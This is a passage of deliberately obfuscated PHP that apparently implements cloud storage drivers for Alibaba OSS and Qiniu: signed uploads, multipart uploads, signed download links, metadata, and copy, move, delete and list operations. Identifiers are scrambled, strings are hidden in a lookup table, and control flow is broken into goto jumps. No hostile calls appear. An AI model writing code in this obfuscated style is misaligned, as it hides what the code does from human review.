$BÏÍ®ŠåÄà = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($fèˆµŠÃí¿[1161] => @md5_file($C‚ÛßØ•«å)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a‡›•³Äº¬))); $BÏÍ®ŠåÄà = $this->trafficLimit($fèˆµŠÃí¿[1174], $BÏÍ®ŠåÄà); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($dÑã×•âô), $C‚ÛßØ•«å, $BÏÍ®ŠåÄà); } catch (OSS\Core\OssException $BàÄÖõòÙŞ) { return !1; } return $this->getPathOuter($a‡›•³Äº¬); } public function getHost() { $Eá¯é‰µÎ =& $_SERVER[Ä¿Ş°¨]; $Bé”±’Îƒ = explode($Eá¯é‰µÎ[167], parent::getHost()); return $Bé”±’Îƒ[0] . $Eá¯é‰µÎ[167] . $this->bucket . $Eá¯é‰µÎ[91] . $Bé”±’Îƒ[1]; } public function uploadFormData($cñª»Ë´˜“, $dß„Ğ­•ì = 3600) { goto fÖÎåæ†ôµ; fÖÎåæ†ôµ: $eÁá½ˆ°¨æ =& $_SERVER[Ä¿Ş°¨]; if (!($E¸êµÒÚæ› = $this->getHost())) { return !1; } $D°¥İ‡ÌöÍ = $dß„Ğ­•ì; goto f£è¤µòà; fˆ¨í ·ãä: $Cè“ÚõÁªå = $this->pathFather($cñª»Ë´˜“); $aÜç‘­øÂ = array($eÁá½ˆ°¨æ[1080] => $BÕ‡ „ÏÇ‘, $eÁá½ˆ°¨æ[1081] => array(array($eÁá½ˆ°¨æ[1179], 0, $EåÛ…Àï‡ğ), array($eÁá½ˆ°¨æ[1084], $eÁá½ˆ°¨æ[1085], $Cè“ÚõÁªå))); $e…²¤íëØ = base64_encode(json_encode($aÜç‘­øÂ)); goto B«™Â¾¦Œß; Aº¦•ºÀ: $F‡ƒÜ­Ò»Ô = strpos($BÕ‡ „ÏÇ‘, $eÁá½ˆ°¨æ[280]); $BÕ‡ „ÏÇ‘ = substr($BÕ‡ „ÏÇ‘, 0, $F‡ƒÜ­Ò»Ô) . $eÁá½ˆ°¨æ[1178]; $EåÛ…Àï‡ğ = 1048576000 * 5; goto fˆ¨í ·ãä; f£è¤µòà: $Aºá‘™ì‘ = date($eÁá½ˆ°¨æ[1177], time() + $D°¥İ‡ÌöÍ); $D˜ÓÛğ¾ìî = new DateTime($Aºá‘™ì‘); $BÕ‡ „ÏÇ‘ = $D˜ÓÛğ¾ìî->format(DateTime::ISO8601); goto Aº¦•ºÀ; B«™Â¾¦Œß: $Dêœ‘–ñµ´ = base64_encode(hash_hmac($eÁá½ˆ°¨æ[214], $e…²¤íëØ, $this->secret, !0)); $C ÷¯Ò³ò× = array($eÁá½ˆ°¨æ[1090] => $e…²¤íëØ, $eÁá½ˆ°¨æ[1180] => $this->accessKey, $eÁá½ˆ°¨æ[1086] => $eÁá½ˆ°¨æ[1078], $eÁá½ˆ°¨æ[1181] => $Dêœ‘–ñµ´, $eÁá½ˆ°¨æ[165] => $E¸êµÒÚæ›); $C ÷¯Ò³ò× = $this->trafficLimit($eÁá½ˆ°¨æ[1174], $C ÷¯Ò³ò×); goto B¡”áÈ Ë£; B¡”áÈ Ë£: return $C ÷¯Ò³ò×; goto EÛí‚¶…“á; EÛí‚¶…“á: } public function multiUploadFormData($fôµÊØÓÖ, $dæÔïØ‘ã = 3600) { $eˆÊˆêœÂ¢ =& $_SERVER[Ä¿Ş°¨]; if (!($C©ÒÒäŸéÅ = $this->getHost())) { return !1; } $AäÑ÷í¥ = $this->trafficLimit($eˆÊˆêœÂ¢[1174]); $aë—òë¶Ã¦ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fôµÊØÓÖ), $AäÑ÷í¥); return array($eˆÊˆêœÂ¢[205] => $aë—òë¶Ã¦, $eˆÊˆêœÂ¢[165] => $C©ÒÒäŸéÅ . $eˆÊˆêœÂ¢[8] . $this->pathEncode($fôµÊØÓÖ), $eˆÊˆêœÂ¢[206] => gmdate($eˆÊˆêœÂ¢[1182]), $eˆÊˆêœÂ¢[89] => $fôµÊØÓÖ); } public function multiUploadAuthData($B¶ ÄŒÛ», $bÂÙ¶Î³–Å = array()) { goto f¥¥Á»¹Š¯; bõË®äŠˆ«: $FšÛææ©ö¢ = $B¶ ÄŒÛ»; if (isset($bÂÙ¶Î³–Å[$Eë¶–»†ê [89]])) { $FšÛææ©ö¢ = $bÂÙ¶Î³–Å[$Eë¶–»†ê [89]]; unset($bÂÙ¶Î³–Å[$Eë¶–»†ê [89]]); } if (isset($bÂÙ¶Î³–Å[$Eë¶–»†ê [207]])) { $bÂÙ¶Î³–Å[$Eë¶–»†ê [206]] = $A»ËÚ…é›‡; return $this->listUploadParts($FšÛææ©ö¢, $bÂÙ¶Î³–Å); } goto Bâ¨Šç…–; e£÷İÁß‰Ø: if (!empty($bÂÙ¶Î³–Å[$Eë¶–»†ê [1184]])) { $eÆŸ³¨¹êŞ = array_merge(array($dï¾ÑÆ¨ÎÌ[4]), $bÂÙ¶Î³–Å[$Eë¶–»†ê [1184]]); sort($eÆŸ³¨¹êŞ); $dï¾ÑÆ¨ÎÌ[4] = implode($Eë¶–»†ê [213], $eÆŸ³¨¹êŞ); } $Eñì§‚”‰˜ = implode($Eë¶–»†ê [213], $dï¾ÑÆ¨ÎÌ); $eâ¥ôÂÓæŞ = base64_encode(hash_hmac($Eë¶–»†ê [214], $Eñì§‚”‰˜, $this->secret, !0)); goto c»ƒØ÷Ğ†; f¥¥Á»¹Š¯: $Eë¶–»†ê  =& $_SERVER[Ä¿Ş°¨]; $A»ËÚ…é›‡ = isset($bÂÙ¶Î³–Å[$Eë¶–»†ê [206]]) ? $bÂÙ¶Î³–Å[$Eë¶–»†ê [206]] : gmdate($Eë¶–»†ê [1182]); $A½ÔÜ¤…Ğ˜ = isset($bÂÙ¶Î³–Å[$Eë¶–»†ê [156]]) ? $bÂÙ¶Î³–Å[$Eë¶–»†ê [156]] : $Eë¶–»†ê [33]; goto bõË®äŠˆ«; Bâ¨Šç…–: $dï¾ÑÆ¨ÎÌ = array($Eë¶–»†ê [208], $Eë¶–»†ê [33], $Eë¶–»†ê [115], $A»ËÚ…é›‡, "\170\x2d\x6f\163\163\x2d\x64\x61\164\x65\72{$A»ËÚ…é›‡}", $Eë¶–»†ê [8] . $this->bucket . $Eë¶–»†ê [8] . $FšÛææ©ö¢ . $A½ÔÜ¤…Ğ˜); if (strpos($A½ÔÜ¤…Ğ˜, $Eë¶–»†ê [209]) === 0) { $dï¾ÑÆ¨ÎÌ[0] = $Eë¶–»†ê [210]; if ($dŒéâĞøÎ = $this->trafficLimit($Eë¶–»†ê [1174])) { $FšÛææ©ö¢ = $Eë¶–»†ê [1183]; array_splice($dï¾ÑÆ¨ÎÌ, 5, 0, $FšÛææ©ö¢ . $Eë¶–»†ê [4] . $dŒéâĞøÎ[$FšÛææ©ö¢]); } } if (isset($bÂÙ¶Î³–Å[$Eë¶–»†ê [211]]) && $bÂÙ¶Î³–Å[$Eë¶–»†ê [211]] == $Eë¶–»†ê [212]) { $dï¾ÑÆ¨ÎÌ[0] = $Eë¶–»†ê [212]; } goto e£÷İÁß‰Ø; c»ƒØ÷Ğ†: $aø«ê»³” = $Eë¶–»†ê [1185] . $this->accessKey . $Eë¶–»†ê [4] . $eâ¥ôÂÓæŞ; if (strpos($A½ÔÜ¤…Ğ˜, $Eë¶–»†ê [209]) === 0) { $aø«ê»³” = array($Eë¶–»†ê [216] => $aø«ê»³”, $Eë¶–»†ê [206] => $A»ËÚ…é›‡); if ($dŒéâĞøÎ) { $aø«ê»³” = array_merge($aø«ê»³”, $dŒéâĞøÎ); } } return $aø«ê»³”; goto cŒ¯Ôè¤†Ô; cŒ¯Ôè¤†Ô: } public function listUploadParts($eà¼µìÀ‰æ, $Dõ’Ë›¸ß™) { goto d¦Ô†ãëÉ; a«°¥Üù…¶: $BÉâ³á›ã = $DˆË©éÔ…ˆ->getListPart(); $c¦Ã¯­÷Èå = array(); foreach ($BÉâ³á›ã as $Aä‹© ˆø) { $c¦Ã¯­÷Èå[] = array($C‹éçœçÑ»[1165] => $Aä‹© ˆø->getPartNumber(), $C‹éçœçÑ»[1166] => trim($Aä‹© ˆø->getETag(), $C‹éçœçÑ»[112])); } goto Eáˆ·ºïŒ; d¦Ô†ãëÉ: $C‹éçœçÑ» =& $_SERVER[Ä¿Ş°¨]; $CÅÛÈÂÚÚ = parse_url_query($Dõ’Ë›¸ß™[$C‹éçœçÑ»[156]]); $DˆË©éÔ…ˆ = $this->client->listParts($this->bucket, $this->pathEncode($eà¼µìÀ‰æ), $CÅÛÈÂÚÚ[$C‹éçœçÑ»[205]]); goto a«°¥Üù…¶; Eáˆ·ºïŒ: unset($Dõ’Ë›¸ß™[$C‹éçœçÑ»[207]], $Dõ’Ë›¸ß™[$C‹éçœçÑ»[211]]); $bÕÊŠòŒ–£ = $this->multiUploadAuthData($eà¼µìÀ‰æ, $Dõ’Ë›¸ß™); if (empty($bÕÊŠòŒ–£)) { return !1; } goto D«„œ†éÁ; D«„œ†éÁ: return array($C‹éçœçÑ»[216] => $bÕÊŠòŒ–£, $C‹éçœçÑ»[206] => $Dõ’Ë›¸ß™[$C‹éçœçÑ»[206]], $C‹éçœçÑ»[218] => $c¦Ã¯­÷Èå); goto BÌ‚¹æ‹¤; BÌ‚¹æ‹¤: } public function download($Cº‹º‚Ú•Ô, $FŠ’ºËÌ) { if ($this->isFolder($Cº‹º‚Ú•Ô)) { return !1; } try { $Aßëø’ó»” = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $FŠ’ºËÌ); $Aßëø’ó»” = $this->trafficLimit($_SERVER[Ä¿Ş°¨][104], $Aßëø’ó»”); $this->client->getObject($this->bucket, $this->pathEncode($Cº‹º‚Ú•Ô), $Aßëø’ó»”); } catch (OSS\Core\OssException $AŠËÛ‚Ó‚Ë) { return !1; } return $FŠ’ºËÌ; } public function fileSubstr($a´öŸÄ˜·ó, $bÛ¨’¹ø‘™ = 0, $A²°åªÅÄÛ = false) { if ($bÛ¨’¹ø‘™ === -1) { $e £«ç•Â = array(); } else { if ($A²°åªÅÄÛ === !1) { $Dõ´¾ĞÏœ¢ = $this->size($a´öŸÄ˜·ó); } else { $Dõ´¾ĞÏœ¢ = $bÛ¨’¹ø‘™ + $A²°åªÅÄÛ - 1; } $e £«ç•Â = array(OSS\OssClient::OSS_RANGE => "{$bÛ¨’¹ø‘™}\55{$Dõ´¾ĞÏœ¢}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($a´öŸÄ˜·ó), $e £«ç•Â); } catch (OSS\Core\OssException $f¿ÈÚèÕÖ) { think_exception($f¿ÈÚèÕÖ->getMessage()); return !1; } } private function trafficLimit($f‹Áâ¢é§†, $e’Â¦É³ÒÎ = array()) { goto a¸¥óº¾Ò; E‰ç”âë©„: if (!$E´İÇŠ­×) { return $e’Â¦É³ÒÎ; } $E´İÇŠ­× = $E´İÇŠ­× < 819200 ? 819200 : ($E´İÇŠ­× > 838860800 ? 838860800 : $E´İÇŠ­×); $e’Â¦É³ÒÎ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E´İÇŠ­×); goto BÉäÂ·‚™Å; BÉäÂ·‚™Å: return $e’Â¦É³ÒÎ; goto cÔÍßğ¢¬; a¸¥óº¾Ò: $F¸¹Èá­–ˆ =& $_SERVER[Ä¿Ş°¨]; if ($f‹Áâ¢é§† == $F¸¹Èá­–ˆ[1174] && $this->isUploadServer() || $f‹Áâ¢é§† == $F¸¹Èá­–ˆ[104] && $this->isFileOutServer()) { return $e’Â¦É³ÒÎ; } $E´İÇŠ­× = floatval($GLOBALS[$F¸¹Èá­–ˆ[6]][$F¸¹Èá­–ˆ[84]][$F¸¹Èá­–ˆ[102]][$f‹Áâ¢é§†]) * 1024 * 1024 * 8; goto E‰ç”âë©„; cÔÍßğ¢¬: } public function link($F™ëŒÀéî, $B‚õ¹†‡¹ = array()) { $dŠ…†àğí‚ =& $_SERVER[Ä¿Ş°¨]; if (!$this->exist($F™ëŒÀéî) || $this->isFolder($F™ëŒÀéî)) { return !1; } try { $B‚õ¹†‡¹ = $this->trafficLimit($dŠ…†àğí‚[104], $B‚õ¹†‡¹); $CË½âëÓ¤Ø = $this->client->signUrl($this->bucket, $this->pathEncode($F™ëŒÀéî), 3600 * 12, $dŠ…†àğí‚[212], $B‚õ¹†‡¹); return $this->getCdnLink($CË½âëÓ¤Ø); } catch (OSS\Core\OssException $E¸ù°«”°) { return !1; } } public function fileOut($B¾òŠï§¦Î, $cÌ£–Ô“® = false, $D§±ª‹“àå = false, $d¸Òƒ±…Óï = '') { goto D„“Úã‚Şï; D„“Úã‚Şï: $eïÛ»—Â =& $_SERVER[Ä¿Ş°¨]; if (!$D§±ª‹“àå) { $D§±ª‹“àå = $this->pathThis($B¾òŠï§¦Î); } $D§±ª‹“àå = rawurlencode($D§±ª‹“àå); goto aÆÖÈ¹–í; aÆÖÈ¹–í: $f†öµºÈ±Œ = get_file_mime(get_path_ext($D§±ª‹“àå)); if ($f†öµºÈ±Œ == $eïÛ»—Â[197]) { return parent::fileOut($B¾òŠï§¦Î, $cÌ£–Ô“®, $D§±ª‹“àå, $d¸Òƒ±…Óï); } $cÌ£–Ô“® = $cÌ£–Ô“® ? $eïÛ»—Â[198] : $eïÛ»—Â[199]; goto eØÏì‡Æ½¶; aÇ©Çàõí÷: $this->fileOutLink($dØÊñÂº°õ); goto F‘Áô¶Ô¶‘; eØÏì‡Æ½¶: $CÍ©²—åÚ¼ = array(OSS\OssClient::OSS_SUB_RESOURCE => $eïÛ»—Â[1186] . rawurlencode("{$cÌ£–Ô“®}\73\146\x69\x6c\145\x6e\x61\x6d\x65\x3d{$D§±ª‹“àå}")); $CÍ©²—åÚ¼[OSS\OssClient::OSS_SUB_RESOURCE] .= $eïÛ»—Â[1187] . $f†öµºÈ±Œ; $dØÊñÂº°õ = $this->link($B¾òŠï§¦Î, $CÍ©²—åÚ¼); goto aÇ©Çàõí÷; F‘Áô¶Ô¶‘: } public function fileOutServer($dîÑÜÓŒì, $AğÕ‡ã‹Ì× = false, $b’Š§—Í·‹ = false, $fÈÀ…óº¶â = '') { parent::fileOut($dîÑÜÓŒì, $AğÕ‡ã‹Ì×, $b’Š§—Í·‹, $fÈÀ…óº¶â); } public function fileOutImage($C¯„Ö®†, $AÇÏ— éŞ = 250) { $D•×õë¶÷º = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ä¿Ş°¨][1188] . $AÇÏ— éŞ); $aÃªèÊÕ« = $this->link($C¯„Ö®†, $D•×õë¶÷º); $this->fileOutLink($aÃªèÊÕ«); } public function fileOutImageServer($D÷›îµ…‡Ú, $F´‰ñª¢°© = 250) { parent::fileOutImage($D÷›îµ…‡Ú, $F´‰ñª¢°©); } public function fileOutLink($d§¾è¼³) { $c¬çñ–ÊÔ =& $_SERVER[Ä¿Ş°¨]; if (!$this->isCdnHost() && substr($d§¾è¼³, 0, 7) == $c¬çñ–ÊÔ[1093]) { $d§¾è¼³ = $c¬çñ–ÊÔ[1094] . substr($d§¾è¼³, 7); } header($c¬çñ–ÊÔ[152] . $d§¾è¼³); die; } public function hashMd5($E ÊåÊÀ¼â, $Eæ±¶İ¦¿Ö = '') { $B¤ºëÛ¾í• =& $_SERVER[Ä¿Ş°¨]; $AÛÈ§ö¶› = $this->objectMeta($E ÊåÊÀ¼â); if (!$AÛÈ§ö¶›) { return $B¤ºëÛ¾í•[33]; } if (!isset($AÛÈ§ö¶›[$B¤ºëÛ¾í•[1161]]) && !empty($Eæ±¶İ¦¿Ö)) { $Dœ‰ˆ…ïôò = $this->updateObjMeta($E ÊåÊÀ¼â, array($B¤ºëÛ¾í•[1161] => $Eæ±¶İ¦¿Ö)); $AÛÈ§ö¶›[$B¤ºëÛ¾í•[1161]] = $Dœ‰ˆ…ïôò ? $Eæ±¶İ¦¿Ö : $B¤ºëÛ¾í•[33]; } return isset($AÛÈ§ö¶›[$B¤ºëÛ¾í•[1161]]) ? strtolower($AÛÈ§ö¶›[$B¤ºëÛ¾í•[1161]]) : $B¤ºëÛ¾í•[33]; } public function size($DõˆÒšä) { $Dª ƒ’ºŠˆ = $this->objectMeta($DõˆÒšä); return $Dª ƒ’ºŠˆ ? $Dª ƒ’ºŠˆ[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function info($E—³·åµÒä) { if ($this->isFolder($E—³·åµÒä)) { return $this->folderInfo($E—³·åµÒä); } else { if ($this->isFile($E—³·åµÒä)) { return $this->fileInfo($E—³·åµÒä); } } return !1; } public function exist($B¿îİ¸¾Ş) { return $this->isFile($B¿îİ¸¾Ş) || $this->isFolder($B¿îİ¸¾Ş); } public function isFile($f†³¬œÃ÷) { return !$this->isFolder($f†³¬œÃ÷) && $this->objectMeta($f†³¬œÃ÷); } public function isFolder($CîæºÊæğº) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][219], $CîæºÊæğº); } protected function objectMeta($b¼À™Æ‚ˆ±) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][220], $b¼À™Æ‚ˆ±); } protected function _objectMeta($EœÚ…”©õå) { $F·ò¾©ëš =& $_SERVER[Ä¿Ş°¨]; try { $F·­ÓŠĞñ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($EœÚ…”©õå)); } catch (OSS\Core\OssException $F¨ÎËä×·) { $F·­ÓŠĞñ = !1; } if ($F·­ÓŠĞñ) { $F·­ÓŠĞñ[$F·ò¾©ëš[77]] = intval($F·­ÓŠĞñ[$F·ò¾©ëš[1168]]); } return $F·­ÓŠĞñ; } protected function _isFolder($EÏ­ÑÃŞÄ©) { $BÄ¨Èˆ‚Ÿ =& $_SERVER[Ä¿Ş°¨]; if ($EÏ­ÑÃŞÄ© == $BÄ¨Èˆ‚Ÿ[33] || $EÏ­ÑÃŞÄ© == $BÄ¨Èˆ‚Ÿ[8]) { return !0; } $FÄÕ¿Ü¡ÚÊ = array($BÄ¨Èˆ‚Ÿ[1158] => $BÄ¨Èˆ‚Ÿ[8], $BÄ¨Èˆ‚Ÿ[182] => rtrim($EÏ­ÑÃŞÄ©, $BÄ¨Èˆ‚Ÿ[8]) . $BÄ¨Èˆ‚Ÿ[8], $BÄ¨Èˆ‚Ÿ[1159] => 1, $BÄ¨Èˆ‚Ÿ[1160] => $BÄ¨Èˆ‚Ÿ[33]); $e×İ´’Ë²â = $this->client->listObjects($this->bucket, $FÄÕ¿Ü¡ÚÊ); if ($e×İ´’Ë²â->getObjectList() || $e×İ´’Ë²â->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($DÏñÖœ·ãæ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ä¿Ş°¨][1189]; $this->_init($DÏñÖœ·ãæ); } public function _init($FïñÉÔ‰˜´) { foreach ($FïñÉÔ‰˜´ as $AÓ«ÜáõÍÁ => $b©Ê¨®¤åç) { if (isset($this->{$AÓ«ÜáõÍÁ})) { $this->{$AÓ«ÜáõÍÁ} = $b©Ê¨®¤åç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ä¿Ş°¨][1190], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Eá‡‹Ñ„Û, $Aí˜§ğˆÊ = '', $dš–ƒååí½ = REPEAT_RENAME) { if ($this->setContent($Eá‡‹Ñ„Û, $Aí˜§ğˆÊ)) { return $this->getPathOuter($Eá‡‹Ñ„Û); } return !1; } public function mkdir($Dñ»»Ê–“, $e²°×©æœ¬ = REPEAT_SKIP) { goto FÁë‡ñ™Ï”; bÖ¿íÊÖù: $Dñ»»Ê–“ = $CÇÈ Úù÷î . $a÷ÍÀ¸‘‹¢[8]; $A°Œ¼Í´îİ = get_path_this($CÇÈ Úù÷î); $FêÒ‰è–ƒ = $Dñ»»Ê–“ . $A°Œ¼Í´îİ; goto aƒ•¬ëƒ±À; FÁë‡ñ™Ï”: $a÷ÍÀ¸‘‹¢ =& $_SERVER[Ä¿Ş°¨]; $CÇÈ Úù÷î = trim($Dñ»»Ê–“, $a÷ÍÀ¸‘‹¢[8]); if ($this->_isFolder($CÇÈ Úù÷î)) { return $this->getPathOuter($CÇÈ Úù÷î); } goto bÖ¿íÊÖù; aƒ•¬ëƒ±À: if (!$this->mkfile($FêÒ‰è–ƒ)) { return !1; } if (!$this->moveFile($FêÒ‰è–ƒ, $Dñ»»Ê–“)) { $this->delFile($FêÒ‰è–ƒ); return !1; } return $this->getPathOuter($CÇÈ Úù÷î); goto d¶Ò„íöËÎ; d¶Ò„íöËÎ: } public function copyFile($F¤‡ÃÌñµâ, $D”õôÛİ¶†) { $fÈ˜ÓÔÙ‰Ã = $this->bucketManager->copy($this->bucket, $F¤‡ÃÌñµâ, $this->bucket, $D”õôÛİ¶†, !0); return $fÈ˜ÓÔÙ‰Ã ? !1 : !0; } public function moveFile($c˜çªÚŒ¡, $B–Íé¼½«…) { $f˜å’ĞÑÃ» = $this->bucketManager->move($this->bucket, $c˜çªÚŒ¡, $this->bucket, $B–Íé¼½«…, !0); return $f˜å’ĞÑÃ» ? !1 : !0; } public function delFile($Fİôè§Ú‚á) { $aÅ­ªÇÚí— = $this->bucketManager->delete($this->bucket, $Fİôè§Ú‚á); return $aÅ­ªÇÚí— ? !1 : !0; } public function delFolder($Eà–ªáœ ™) { $a½…ÀÓÁë’ = $this->fileList($Eà–ªáœ ™); if (empty($a½…ÀÓÁë’)) { return !0; } $C†ÈâïŠ› = 1000; if (count($a½…ÀÓÁë’) <= $C†ÈâïŠ›) { return $this->qnDelObj($a½…ÀÓÁë’) ? !1 : !0; } foreach (array_chunk($a½…ÀÓÁë’, $C†ÈâïŠ›) as $c‚çßÚƒ£) { $B«‘×íÇĞ = $this->qnDelObj($c‚çßÚƒ£); if ($B«‘×íÇĞ) { return !1; } } return !0; } private function qnDelObj($Fç©â»‚) { $Fàœ´–ÅÍ = $this->bucketManager->buildBatchDelete($this->bucket, $Fç©â»‚); list($e©§â›É¢‹, $c°ƒÙ¤‚Ä˜) = $this->bucketManager->batch($Fàœ´–ÅÍ); return $c°ƒÙ¤‚Ä˜; } private function fileList($b¼¯ÄÅë·, $b‚Ù‘Œ¸íÃ = 0) { goto Böš¡ÇëÍ•; FéŠŸñ÷: $B³“é›æ = array(); while (!0) { list($DºÓ•´¹ö”, $FëšÙíÂ´) = $this->bucketManager->listFiles($this->bucket, $a•¿À¤Óë, $d„ó¤¨ÏõÓ, $BµŞšùŞó, $dÑ‹Òõ…Ëù); if ($FëšÙíÂ´) { return !1; } $d„ó¤¨ÏõÓ = array_key_exists($a¦äñ±¦÷Ò[1160], $DºÓ•´¹ö”) ? $d„ó¤¨ÏõÓ = $DºÓ•´¹ö”[$a¦äñ±¦÷Ò[1191]] : $a¦äñ±¦÷Ò[33]; foreach ($DºÓ•´¹ö”[$a¦äñ±¦÷Ò[1192]] as $A¸–ŸèçŠà) { $Dæ‡•¡¿ö¿ = $A¸–ŸèçŠà[$a¦äñ±¦÷Ò[89]]; if ($b‚Ù‘Œ¸íÃ) { $Dæ‡•¡¿ö¿ = array($a¦äñ±¦÷Ò[28] => $Dæ‡•¡¿ö¿, $a¦äñ±¦÷Ò[77] => $A¸–ŸèçŠà[$a¦äñ±¦÷Ò[1193]]); } $B³“é›æ[] = $Dæ‡•¡¿ö¿; } if ($d„ó¤¨ÏõÓ == $a¦äñ±¦÷Ò[33]) { break; } } return $B³“é›æ; goto d¸ŸŒÎğóª; Böš¡ÇëÍ•: $a¦äñ±¦÷Ò =& $_SERVER[Ä¿Ş°¨]; $b¼¯ÄÅë· = trim($b¼¯ÄÅë·, $a¦äñ±¦÷Ò[8]); $a•¿À¤Óë = empty($b¼¯ÄÅë·) ? $a¦äñ±¦÷Ò[33] : $b¼¯ÄÅë· . $a¦äñ±¦÷Ò[8]; goto DÈ´ôØº‘ë; DÈ´ôØº‘ë: $d„ó¤¨ÏõÓ = $a¦äñ±¦÷Ò[33]; $BµŞšùŞó = 1000; $dÑ‹Òõ…Ëù = $a¦äñ±¦÷Ò[33]; goto FéŠŸñ÷; d¸ŸŒÎğóª: } public function rename($EÙ©Öß…³¤, $a³¬«¤õ–ˆ) { return $this->renameObject($EÙ©Öß…³¤, $a³¬«¤õ–ˆ); } public function fileInfo($fó”Å†„Æ¤, $Cñ¦ˆÅ„¶¾ = false, $F­ğÉğ©À = array()) { goto B¼Û”¤‚ˆ; Cİ¿Ï³ö—¥: if (empty($F­ğÉğ©À)) { $F­ğÉğ©À = $this->objectMeta($fó”Å†„Æ¤); if (!$F­ğÉğ©À) { return $fÉ•²ÌŞ“; } } if (isset($F­ğÉğ©À[$aåÃòïè‘¤[1194]])) { $fÉ•²ÌŞ“[$aåÃòïè‘¤[183]] = $F­ğÉğ©À[$aåÃòïè‘¤[1194]]; } if (isset($F­ğÉğ©À[$aåÃòïè‘¤[1193]])) { $fÉ•²ÌŞ“[$aåÃòïè‘¤[77]] = $F­ğÉğ©À[$aåÃòïè‘¤[1193]]; } goto f«‡·…äÄ†; f«‡·…äÄ†: return $fÉ•²ÌŞ“; goto EÂ›”¯ÆÃµ; B¼Û”¤‚ˆ: $aåÃòïè‘¤ =& $_SERVER[Ä¿Ş°¨]; if ($Cñ¦ˆÅ„¶¾) { return array($aåÃòïè‘¤[28] => $this->pathThis($fó”Å†„Æ¤), $aåÃòïè‘¤[75] => $this->getPathOuter($aåÃòïè‘¤[8] . $fó”Å†„Æ¤), $aåÃòïè‘¤[29] => $aåÃòïè‘¤[163], $aåÃòïè‘¤[77] => isset($F­ğÉğ©À[$aåÃòïè‘¤[1193]]) ? $F­ğÉğ©À[$aåÃòïè‘¤[1193]] : 0, $aåÃòïè‘¤[156] => $this->ext($fó”Å†„Æ¤)); } $fÉ•²ÌŞ“ = array($aåÃòïè‘¤[28] => $this->pathThis($fó”Å†„Æ¤), $aåÃòïè‘¤[75] => $this->getPathOuter($aåÃòïè‘¤[8] . $fó”Å†„Æ¤), $aåÃòïè‘¤[29] => $aåÃòïè‘¤[163], $aåÃòïè‘¤[183] => 0, $aåÃòïè‘¤[106] => 0, $aåÃòïè‘¤[77] => 0, $aåÃòïè‘¤[156] => $this->ext($fó”Å†„Æ¤), $aåÃòïè‘¤[184] => !0, $aåÃòïè‘¤[185] => !0); goto Cİ¿Ï³ö—¥; EÂ›”¯ÆÃµ: } public function folderInfo($BÎä·çèôÑ, $cÍ–˜³É‡˜ = false) { goto bİ™’óˆÛ; bİ™’óˆÛ: $a“ĞÎÈçô =& $_SERVER[Ä¿Ş°¨]; if ($cÍ–˜³É‡˜) { return array($a“ĞÎÈçô[28] => $this->pathThis($BÎä·çèôÑ), $a“ĞÎÈçô[75] => $this->getPathOuter($a“ĞÎÈçô[8] . $BÎä·çèôÑ), $a“ĞÎÈçô[29] => $a“ĞÎÈçô[76]); } $b©ÈñĞ‹†š = array($a“ĞÎÈçô[28] => $this->pathThis($BÎä·çèôÑ), $a“ĞÎÈçô[75] => $this->getPathOuter($a“ĞÎÈçô[8] . $BÎä·çèôÑ), $a“ĞÎÈçô[29] => $a“ĞÎÈçô[76], $a“ĞÎÈçô[183] => 0, $a“ĞÎÈçô[106] => 0, $a“ĞÎÈçô[1139] => !0, $a“ĞÎÈçô[1140] => !0); goto E¿§½²œ´; dÊÀŠ¬â¹ƒ: return $b©ÈñĞ‹†š; goto a ’‰Ó‹ù; E¿§½²œ´: $BÎä·çèôÑ = rtrim($BÎä·çèôÑ, $a“ĞÎÈçô[8]) . $a“ĞÎÈçô[8]; $b‘×šÒìëÖ = $this->objectMeta($BÎä·çèôÑ); if (isset($b‘×šÒìëÖ[$a“ĞÎÈçô[1194]])) { $b©ÈñĞ‹†š[$a“ĞÎÈçô[183]] = $b‘×šÒìëÖ[$a“ĞÎÈçô[1194]]; } goto dÊÀŠ¬â¹ƒ; a ’‰Ó‹ù: } public function listPath($bÜ”±µôÖ÷, $FÎ‘´à†œé = false) { goto dŞ„ê“Âö’; e£ìÅ›»´: $F™×Õ…‚×Ğ = $dŠ¡½•àÊ[33]; $FÜ¼‘Î†¨Á = 1000; $aœ¼Ø¸©´ = $dŠ¡½•àÊ[8]; goto bİ×öù§Áİ; bİ×öù§Áİ: $B¬ßÙ£… = $D‰ƒŸ¿¨¸ = array(); while (!0) { list($F­Ô®äÌ—î, $CîäÏÃß’) = $this->bucketManager->listFiles($this->bucket, $bä™®·ã„, $F™×Õ…‚×Ğ, $FÜ¼‘Î†¨Á, $aœ¼Ø¸©´); if ($CîäÏÃß’) { return !1; } $F™×Õ…‚×Ğ = array_key_exists($dŠ¡½•àÊ[1160], $F­Ô®äÌ—î) ? $F™×Õ…‚×Ğ = $F­Ô®äÌ—î[$dŠ¡½•àÊ[1191]] : $dŠ¡½•àÊ[33]; if (isset($F­Ô®äÌ—î[$dŠ¡½•àÊ[1195]])) { foreach ($F­Ô®äÌ—î[$dŠ¡½•àÊ[1195]] as $eì–¤ĞŠ’Œ) { if ($eì–¤ĞŠ’Œ == $bä™®·ã„) { continue; } 